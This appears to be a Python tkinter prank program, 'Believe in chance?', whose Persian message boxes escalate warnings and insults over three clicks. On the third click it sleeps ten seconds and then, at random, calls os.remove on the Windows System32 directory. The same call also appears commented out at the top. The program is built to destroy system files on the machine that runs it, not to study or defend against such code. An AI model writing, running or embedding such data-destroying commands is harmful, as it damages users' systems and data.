import os
import random
# if random.randint(0,6) == 1:
#     os.remove('C:\Windows\System32')
from tkinter import *
from tkinter.messagebox import *
import time

times = 0

def _onStartButtonClicked():
    global times
    try:
        times += 1
        match times:
            case 1:
                showinfo(title='Info', message='قراره ببینی واقعا خوش شانسی؟\n.این برنامه اعداد رندوم میسازه و طبق اون ی کار خطرناکی میکنه\n.برای ادامه دوباره کلیک کن')
            case 2:
                showwarning(title='Warning', message='.از اول بگم که آدم باش و برگرد از این کار و دیگه کلیک نکن، در غیر اینصورت اتفاقای جالبی نمی افته و هر اتفاقی افتاد من مقصر نیستم و از اول بهت گفتم که نکن، خودت دیگه آدم *** هستی و ادامه میدی هیچ مسئولیتی هم قبول نمیکنم')
            case 3:
                showerror(title='Error', message='دیگه از بین رفتی، لعنتی چرا میخاری؟؟ مشکل داری؟ برو پیش پزشکی چیزی، الان به احتمال 10 درصد سیستم32 شما قراره بعد از 10 ثانیه از بین بره و منم هیچ مسئولیتی قبول نمیکنم')
                time.sleep(10)
                if random.randint(0,6) == 1:
                    os.remove('C:\Windows\System32')
            case _:
                print('Did not match a case.')
    except Exception as e:
        assert e
    

def main():
    home = Tk()
    home.title('Believe in chance?')
    home.geometry('400x400')
    home.resizable(0,0)
    
    startButton = Button(
        home, 
        text="START", 
        bg='white', 
        font=("Helvetica", 12, 'bold'), 
        foreground='red',
        command= _onStartButtonClicked,
    )
    
    startButton.pack(pady=160)
    
    
    home.mainloop()


if __name__ == '__main__':
    main()